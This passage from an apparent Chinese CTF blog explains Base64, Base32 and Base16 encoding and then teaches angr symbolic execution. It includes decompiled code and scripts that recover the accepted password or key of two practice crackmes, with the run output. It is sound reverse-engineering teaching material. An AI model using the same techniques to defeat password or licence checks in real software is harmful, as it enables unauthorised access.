base64[<span class="number">128</span>];</span><br><span class="line">	base64_encode(sourcedata, base64);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"编码：%s\n"</span>, base64);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">char</span> dedata[<span class="number">128</span>];</span><br><span class="line"></span><br><span class="line">	base64_decode(base64, (<span class="keyword">unsigned</span> <span class="keyword">char</span>*)dedata);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"译码：%s"</span>, dedata);</span><br><span class="line"></span><br><span class="line">	getchar();</span><br><span class="line">	getchar();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输入如下</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">C:\Users\thunder&gt;<span class="string">"D:\AlgorithmTest.exe"</span></span><br><span class="line">编码：YTQ1cmJjZA==</span><br><span class="line">译码：a45rbcd</span><br><span class="line"></span><br><span class="line">C:\Users\thunder&gt;</span><br></pre></td></tr></table></figure>
<p>上面的代码是base64加密和解密字符串<code>a45rbcd</code>我们用IDA查看，base64char即是我们的索引表</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">base64_encode</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *sourcedata, <span class="keyword">char</span> *base64)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> v2; <span class="comment">// STEC_4</span></span><br><span class="line">  <span class="keyword">int</span> v3; <span class="comment">// STEC_4</span></span><br><span class="line">  <span class="keyword">int</span> v4; <span class="comment">// STEC_4</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> datalength; <span class="comment">// [esp+D0h] [ebp-2Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 trans_index; <span class="comment">// [esp+DFh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int8 trans_indexa; <span class="comment">// [esp+DFh] [ebp-1Dh]</span></span><br><span class="line">  <span class="keyword">int</span> j; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> ja; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> jb; <span class="comment">// [esp+E8h] [ebp-14h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [esp+F4h] [ebp-8h]</span></span><br><span class="line"></span><br><span class="line">  i = <span class="number">0</span>;</span><br><span class="line">  j = <span class="number">0</span>;</span><br><span class="line">  datalength = j__strlen(sourcedata);</span><br><span class="line">  <span class="keyword">while</span> ( i &lt; datalength )</span><br><span class="line">  &#123;</span><br><span class="line">    base64[j] = base64char[((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)sourcedata[i] &gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x3F</span>]; # 右移</span><br><span class="line">    ja = j + <span class="number">1</span>;</span><br><span class="line">    trans_index = <span class="number">16</span> * sourcedata[i] &amp; <span class="number">0x30</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i + <span class="number">1</span> &gt;= datalength )</span><br><span class="line">    &#123;</span><br><span class="line">      base64[ja] = base64char[trans_index];</span><br><span class="line">      v2 = ja + <span class="number">1</span>;</span><br><span class="line">      base64[v2++] = padding_char;</span><br><span class="line">      base64[v2] = padding_char;</span><br><span class="line">      j = v2 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    base64[ja] = base64char[((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)sourcedata[i + <span class="number">1</span>] &gt;&gt; <span class="number">4</span>) &amp; <span class="number">0xF</span> | trans_index]; # 右移</span><br><span class="line">    jb = ja + <span class="number">1</span>;</span><br><span class="line">    trans_indexa = <span class="number">4</span> * sourcedata[i + <span class="number">1</span>] &amp; <span class="number">0x3C</span>;</span><br><span class="line">    <span class="keyword">if</span> ( i + <span class="number">2</span> &gt;= datalength )</span><br><span class="line">    &#123;</span><br><span class="line">      base64[jb] = base64char[trans_indexa];</span><br><span class="line">      v4 = jb + <span class="number">1</span>;</span><br><span class="line">      base64[v4] = padding_char;</span><br><span class="line">      j = v4 + <span class="number">1</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    base64[jb] = base64char[((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)sourcedata[i + <span class="number">2</span>] &gt;&gt; <span class="number">6</span>) &amp; <span class="number">3</span> | trans_indexa]; # 右移</span><br><span class="line">    v3 = jb + <span class="number">1</span>;</span><br><span class="line">    base64[v3] = base64char[sourcedata[i + <span class="number">2</span>] &amp; <span class="number">0x3F</span>];</span><br><span class="line">    j = v3 + <span class="number">1</span>;</span><br><span class="line">    i += <span class="number">3</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  base64[j] = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="辨别"><a href="#辨别" class="headerlink" title="辨别"></a>辨别</h2><p>其实辨别很简单，有很多的方法，最简单的方法就是动态调试，直接用OD或者IDA动态调试，多输入几组数据，观察加密后的字符串，存在<code>=</code>这种字符串多半都有base64加密。 如果不能动态调试那就用IDA静态观察，观察索引表，观察对输入的操作，比如上面很明显的三次右移操作。</p>
<h2 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h2><p>一般解密用python来实现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">'key'</span> <span class="comment"># 要加密的字符串</span></span><br><span class="line">a = base64.b64encode(s) <span class="comment"># 加密</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> base64.b64decode(a) <span class="comment"># 解密</span></span><br></pre></td></tr></table></figure>
<p>在线解密网站 : <a href="https://www.qqxiuzi.cn/bianma/base.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/base.php</a></p>
<h2 id="CTF参考例题"><a href="#CTF参考例题" class="headerlink" title="CTF参考例题"></a>CTF参考例题</h2><p>DDCTF2019 Reverse2</p>
<h1 id="Base32"><a href="#Base32" class="headerlink" title="Base32"></a>Base32</h1><h2 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h2><p>Base32编码是使用32个可打印字符（字母A-Z和数字2-7）对任意字节数据进行编码的方案，编码后的字符串不用区分大小写并排除了容易混淆的字符，可以方便地由人类使用并由计算机处理。</p>
<table>
<thead>
<tr>
<th>值</th>
<th>符号</th>
<th></th>
<th>值</th>
<th>符号</th>
<th></th>
<th>值</th>
<th>符号</th>
<th></th>
<th>值</th>
<th>符号</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>A</td>
<td>8</td>
<td>I</td>
<td>16</td>
<td>Q</td>
<td>24</td>
<td>Y</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>1</td>
<td>B</td>
<td>9</td>
<td>J</td>
<td>17</td>
<td>R</td>
<td>25</td>
<td>Z</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>2</td>
<td>C</td>
<td>10</td>
<td>K</td>
<td>18</td>
<td>S</td>
<td>26</td>
<td>2</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>3</td>
<td>D</td>
<td>11</td>
<td>L</td>
<td>19</td>
<td>T</td>
<td>27</td>
<td>3</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>4</td>
<td>E</td>
<td>12</td>
<td>M</td>
<td>20</td>
<td>U</td>
<td>28</td>
<td>4</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>5</td>
<td>F</td>
<td>13</td>
<td>N</td>
<td>21</td>
<td>V</td>
<td>29</td>
<td>5</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>6</td>
<td>G</td>
<td>14</td>
<td>O</td>
<td>22</td>
<td>W</td>
<td>30</td>
<td>6</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td>7</td>
<td>H</td>
<td>15</td>
<td>P</td>
<td>23</td>
<td>X</td>
<td>31</td>
<td>7</td>
<td></td>
<td></td>
<td></td>
</tr>
<tr>
<td><em>填充</em></td>
<td>=</td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
<td></td>
</tr>
</tbody>
</table>
<p>Base32将任意字符串按照字节进行切分，并将每个字节对应的二进制值（不足8比特高位补0）串联起来，按照5比特一组进行切分，并将每组二进制值转换成十进制来对应32个可打印字符中的一个。</p>
<p>由于数据的二进制传输是按照8比特一组进行（即一个字节），因此Base32按5比特切分的二进制数据必须是40比特的倍数（5和8的最小公倍数）。例如输入单字节字符“%”，它对应的二进制值是“100101”，前面补两个0变成“00100101”（二进制值不足8比特的都要在高位加0直到8比特），从左侧开始按照5比特切分成两组：“00100”和“101”，后一组不足5比特，则在末尾填充0直到5比特，变成“00100”和“10100”，这两组二进制数分别转换成十进制数，通过上述表格即可找到其对应的可打印字符“E”和“U”，但是这里只用到两组共10比特，还差30比特达到40比特，按照5比特一组还需6组，则在末尾填充6个“=”。填充“=”符号的作用是方便一些程序的标准化运行，大多数情况下不添加也无关紧要，而且，在URL中使用时必须去掉“=”符号。</p>
<p>与Base64相比，Base32具有许多优点：</p>
<ul>
<li>适合不区分大小写的文件系统，更利于人类口语交流或记忆。</li>
<li>结果可以用作文件名，因为它不包含路径分隔符 “/”等符号。</li>
<li>排除了视觉上容易混淆的字符，因此可以准确的人工录入。（例如，RFC4648符号集忽略了数字“1”、“8”和“0”，因为它们可能与字母“I”，“B”和“O”混淆）。</li>
<li>排除填充符号“=”的结果可以包含在URL中，而不编码任何字符。</li>
</ul>
<p>Base32也比Base16有优势：</p>
<ul>
<li>Base32比Base16占用的空间更小。（1000比特数据Base32需要200个字符，而Base16则为250个字符）</li>
</ul>
<p>Base32的缺点：</p>
<ul>
<li>Base32比Base64多占用大约20％的空间。因为Base32使用8个ASCII字符去编码原数据中的5个字节数据，而Base64是使用4个ASCII字符去编码原数据中的3个字节数据。</li>
</ul>
<h2 id="解密-1"><a href="#解密-1" class="headerlink" title="解密"></a>解密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">'key'</span> <span class="comment"># 要加密的字符串</span></span><br><span class="line">a = base64.b32encode(s) <span class="comment"># 加密</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> base64.b32decode(a) <span class="comment"># 解密</span></span><br></pre></td></tr></table></figure>
<p>在线网站 : <a href="https://www.qqxiuzi.cn/bianma/base.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/base.php</a></p>
<h2 id="CTF参考例题-1"><a href="#CTF参考例题-1" class="headerlink" title="CTF参考例题"></a>CTF参考例题</h2><p>2017第二届广东省强网杯线上赛 Nonstandard</p>
<h1 id="Base16"><a href="#Base16" class="headerlink" title="Base16"></a>Base16</h1><h2 id="原理-1"><a href="#原理-1" class="headerlink" title="原理"></a>原理</h2><p>Base16编码使用16个ASCII可打印字符（数字0-9和字母A-F）对任意字节数据进行编码。Base16先获取输入字符串每个字节的二进制值（不足8比特在高位补0），然后将其串联进来，再按照4比特一组进行切分，将每组二进制数分别转换成十进制，在下述表格中找到对应的编码串接起来就是Base16编码。可以看到8比特数据按照4比特切分刚好是两组，所以Base16不可能用到填充符号“=”。</p>
<p>Base16编码后的数据量是原数据的两倍：1000比特数据需要250个字符（即 250*8=2000 比特）。换句话说：Base16使用两个ASCII字符去编码原数据中的一个字节数据。</p>
<table>
<thead>
<tr>
<th>值</th>
<th>编码</th>
<th>值</th>
<th>编码</th>
</tr>
</thead>
<tbody>
<tr>
<td>0</td>
<td>0</td>
<td>8</td>
<td>8</td>
</tr>
<tr>
<td>1</td>
<td>1</td>
<td>9</td>
<td>9</td>
</tr>
<tr>
<td>2</td>
<td>2</td>
<td>10</td>
<td>A</td>
</tr>
<tr>
<td>3</td>
<td>3</td>
<td>11</td>
<td>B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>12</td>
<td>C</td>
</tr>
<tr>
<td>5</td>
<td>5</td>
<td>13</td>
<td>D</td>
</tr>
<tr>
<td>6</td>
<td>6</td>
<td>14</td>
<td>E</td>
</tr>
<tr>
<td>7</td>
<td>7</td>
<td>15</td>
<td>F</td>
</tr>
</tbody>
</table>
<p>Base16编码是一个标准的十六进制字符串（注意是字符串而不是数值），更易被人类和计算机使用，因为它并不包含任何控制字符，以及Base64和Base32中的“=”符号。输入的非ASCII字符，使用UTF-8字符集。</p>
<h2 id="解密-2"><a href="#解密-2" class="headerlink" title="解密"></a>解密</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">s = <span class="string">'key'</span> <span class="comment"># 要加密的字符串</span></span><br><span class="line">a = base64.b16encode(s) <span class="comment"># 加密</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> a</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> base64.b16decode(a) <span class="comment"># 解密</span></span><br></pre></td></tr></table></figure>
<p>在线网站 : <a href="https://www.qqxiuzi.cn/bianma/base.php" target="_blank" rel="noopener">https://www.qqxiuzi.cn/bianma/base.php</a></p>
<p>参考链接：</p>
<p><a href="http://www.cnblogs.com/hongru/archive/2012/01/14/2321397.html" target="_blank" rel="noopener">http://www.cnblogs.com/hongru/archive/2012/01/14/2321397.html</a></p>
<p><a href="https://blog.csdn.net/u011491972/article/details/52800177" target="_blank" rel="noopener">https://blog.csdn.net/u011491972/article/details/52800177</a></p>
]]></content>
      <categories>
        <category>CTF</category>
        <category>密码篇</category>
      </categories>
      <tags>
        <tag>密码学</tag>
      </tags>
  </entry>
  <entry>
    <title>Angr-CTF符号执行</title>
    <url>/2019/05/05/Angr-CTF%E7%AC%A6%E5%8F%B7%E6%89%A7%E8%A1%8C/</url>
    <content><![CDATA[<h1 id="0x00：简介"><a href="#0x00：简介" class="headerlink" title="0x00：简介"></a>0x00：简介</h1><p>符号执行简单来说就是用符号来模拟程序执行，在我看来就相当于暴力破解，比如一个程序要求你进行一个复杂的运算，每次动态调试只能输入一次，然而符合执行可以尽可能的遍历每一条路径，这样就方便了许多。</p>
<h1 id="0x01：安装"><a href="#0x01：安装" class="headerlink" title="0x01：安装"></a>0x01：安装</h1><p>这里不建议实体机安装，坑太多，直接上docker，<a href="https://blog.csdn.net/Sanky0u/article/details/81155964" target="_blank" rel="noopener">安装教程</a></p>
<h1 id="0x02：例题"><a href="#0x02：例题" class="headerlink" title="0x02：例题"></a>0x02：例题</h1><h2 id="r100-defcamp"><a href="#r100-defcamp" class="headerlink" title="r100(defcamp)"></a>r100(defcamp)</h2><p><a href="whalectf.xin/files/3e8c3473ea4d6bfb6edc385131313dfa/r100">题目链接</a></p>
<p>将程序载入IDA静态分析，主函数如下<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"> <span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-110h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+108h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Enter the password: "</span>, a2, a3);</span><br><span class="line">  <span class="keyword">if</span> ( !fgets(&amp;s, <span class="number">255</span>, <span class="built_in">stdin</span>) )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)sub_4006FD((__int64)&amp;s) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Incorrect password!"</span>);</span><br><span class="line">    result = <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Nice!"</span>);</span><br><span class="line">    result = <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>加密函数如下，因为我们这里用符号执行来做，所以不进行算法分析<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">signed</span> __int64 __<span class="function">fastcall <span class="title">sub_4006FD</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-24h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v3; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v4; <span class="comment">// [rsp+20h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *v5; <span class="comment">// [rsp+28h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="string">"Dufhbmf"</span>;</span><br><span class="line">  v4 = <span class="string">"pG`imos"</span>;</span><br><span class="line">  v5 = <span class="string">"ewUglpt"</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">11</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (&amp;v3)[i % <span class="number">3</span>][<span class="number">2</span> * (i / <span class="number">3</span>)] - *(<span class="keyword">char</span> *)(i + a1) != <span class="number">1</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>我们需要知道的是，程序有两个分支，输入密码后会进行判断，正确输出nice，错误输入wrong，我们希望的是输出nice，那么这里就可以进行用符号执行来做，我们将题目文件拷贝到docker中后，直接写脚本如下，先直观感受一下脚本，我们希望执行0x400844中的内容，不希望执行0x400855的内容，脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr <span class="comment"># 导入angr库</span></span><br><span class="line"></span><br><span class="line">p=angr.Project(<span class="string">'./r100'</span>,auto_load_libs=<span class="literal">False</span>) <span class="comment"># 加载程序</span></span><br><span class="line"></span><br><span class="line">state=p.factory.entry_state() <span class="comment"># 创建一个状态,默认为程序的入口地址</span></span><br><span class="line"></span><br><span class="line">simgr=p.factory.simgr(state) <span class="comment"># 创建一个模拟器用来模拟程序执行,遍历所有路径</span></span><br><span class="line"></span><br><span class="line">res=simgr.explore(find=<span class="number">0x400844</span>,avoid=<span class="number">0x400855</span>) <span class="comment"># 约束执行的流程，0x400844为打印nice附近的地址，0x400855附近即为打印错误的地址</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> (res.found[<span class="number">0</span>].posix.dumps(<span class="number">0</span>)) <span class="comment"># 打印found的第一个结果</span></span><br></pre></td></tr></table></figure></p>
<p>运行结果如下，可以爆破得到密码 ‘Code_Talkers’ ：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) angr@e223cdab7ce9:~$ python exp.py </span><br><span class="line">WARNING | 2019-04-24 12:58:26,540 | angr.state_plugins.symbolic_memory | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING | 2019-04-24 12:58:26,544 | angr.state_plugins.symbolic_memory | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING | 2019-04-24 12:58:26,544 | angr.state_plugins.symbolic_memory | 1) setting a value to the initial state</span><br><span class="line">WARNING | 2019-04-24 12:58:26,544 | angr.state_plugins.symbolic_memory | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING | 2019-04-24 12:58:26,544 | angr.state_plugins.symbolic_memory | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY_REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING | 2019-04-24 12:58:26,546 | angr.state_plugins.symbolic_memory | Filling register r15 with 8 unconstrained bytes referenced from 0x400890 (PLT.ptrace+0x290 <span class="keyword">in</span> r100 (0x400890))</span><br><span class="line">WARNING | 2019-04-24 12:58:26,549 | angr.state_plugins.symbolic_memory | Filling register r14 with 8 unconstrained bytes referenced from 0x400895 (PLT.ptrace+0x295 <span class="keyword">in</span> r100 (0x400895))</span><br><span class="line">WARNING | 2019-04-24 12:58:26,552 | angr.state_plugins.symbolic_memory | Filling register r13 with 8 unconstrained bytes referenced from 0x40089a (PLT.ptrace+0x29a <span class="keyword">in</span> r100 (0x40089a))</span><br><span class="line">WARNING | 2019-04-24 12:58:26,555 | angr.state_plugins.symbolic_memory | Filling register r12 with 8 unconstrained bytes referenced from 0x40089f (PLT.ptrace+0x29f <span class="keyword">in</span> r100 (0x40089f))</span><br><span class="line">WARNING | 2019-04-24 12:58:26,563 | angr.state_plugins.symbolic_memory | Filling register rbx with 8 unconstrained bytes referenced from 0x4008b0 (PLT.ptrace+0x2b0 <span class="keyword">in</span> r100 (0x4008b0))</span><br><span class="line">WARNING | 2019-04-24 12:58:26,657 | angr.state_plugins.symbolic_memory | Filling register cc_ndep with 8 unconstrained bytes referenced from 0x400690 (PLT.ptrace+0x90 <span class="keyword">in</span> r100 (0x400690))</span><br><span class="line"><span class="string">'Code_Talkers\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\xf5\x00'</span></span><br></pre></td></tr></table></figure></p>
<h2 id="crackme-ais3"><a href="#crackme-ais3" class="headerlink" title="crackme(ais3)"></a>crackme(ais3)</h2><p><a href="whalectf.xin/files/5e74de939a30df859f443c08e5ec77d2/ais3_crackme">题目链接</a></p>
<p>同样载入IDA看主函数：<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( argc == <span class="number">2</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> <span class="keyword">int</span>)verify((__int64)argv[<span class="number">1</span>]) )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"Correct! that is the secret key!"</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">"I'm sorry, that's the wrong secret key!"</span>);</span><br><span class="line">    result = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You need to enter the secret key!"</span>);</span><br><span class="line">    result = <span class="number">-1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>程序流程还是和上一题很相似，只是需要我们输入正确的参数从而得到flag，加密函数如下，我们同样不需要分析它<br><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">_BOOL8 __<span class="function">fastcall <span class="title">verify</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+14h] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; *(_BYTE *)(i + a1); ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( encrypted[i] != ((<span class="keyword">unsigned</span> __int8)((<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &lt;&lt; ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>)) | (<span class="keyword">unsigned</span> __int8)((<span class="keyword">signed</span> <span class="keyword">int</span>)(<span class="keyword">unsigned</span> __int8)(*(_BYTE *)(i + a1) ^ i) &gt;&gt; (<span class="number">8</span> - ((i ^ <span class="number">9</span>) &amp; <span class="number">3</span>))))</span><br><span class="line">                       + <span class="number">8</span> )</span><br><span class="line">      <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> i == <span class="number">23</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>符号执行脚本如下：<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> angr</span><br><span class="line"><span class="keyword">import</span> claripy <span class="comment"># 处理用户输入</span></span><br><span class="line"></span><br><span class="line">proj = angr.Project(<span class="string">'./ais3_crackme'</span>)</span><br><span class="line"></span><br><span class="line">argv1 = claripy.BVS(<span class="string">'argv1'</span>, <span class="number">50</span>*<span class="number">8</span>) <span class="comment"># 猜测flag长度小于50,乘8是转换为字节</span></span><br><span class="line"></span><br><span class="line">state = proj.factory.entry_state(args=[<span class="string">'./ais3_crackme'</span>,argv1]) <span class="comment"># 传递状态</span></span><br><span class="line"></span><br><span class="line">simgr = proj.factory.simgr(state)</span><br><span class="line"></span><br><span class="line">res=simgr.explore(find = <span class="number">0x400602</span>, avoid=<span class="number">0x40060e</span>)</span><br><span class="line"></span><br><span class="line">print(hex（res.found[<span class="number">0</span>].solver.eval(argv1)))</span><br></pre></td></tr></table></figure></p>
<p>运行结果，我们只需要将答案转一次base16即可得到flag：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">(angr) angr@e223cdab7ce9:~$ python exp2.py</span><br><span class="line">WARNING | 2019-04-24 13:44:41,180 | angr.state_plugins.symbolic_memory | The program is accessing memory or registers with an unspecified value. This could indicate unwanted behavior.</span><br><span class="line">WARNING | 2019-04-24 13:44:41,181 | angr.state_plugins.symbolic_memory | angr will cope with this by generating an unconstrained symbolic variable and continuing. You can resolve this by:</span><br><span class="line">WARNING | 2019-04-24 13:44:41,181 | angr.state_plugins.symbolic_memory | 1) setting a value to the initial state</span><br><span class="line">WARNING | 2019-04-24 13:44:41,182 | angr.state_plugins.symbolic_memory | 2) adding the state option ZERO_FILL_UNCONSTRAINED_&#123;MEMORY,REGISTERS&#125;, to make unknown regions hold null</span><br><span class="line">WARNING | 2019-04-24 13:44:41,182 | angr.state_plugins.symbolic_memory | 3) adding the state option SYMBOL_FILL_UNCONSTRAINED_&#123;MEMORY_REGISTERS&#125;, to suppress these messages.</span><br><span class="line">WARNING | 2019-04-24 13:44:41,183 | angr.state_plugins.symbolic_memory | Filling register r12 with 8 unconstrained bytes referenced from 0x400625 (__libc_csu_init+0x5 <span class="keyword">in</span> ais3_crackme (0x400625))</span><br><span class="line">WARNING | 2019-04-24 13:44:41,187 | angr.state_plugins.symbolic_memory | Filling 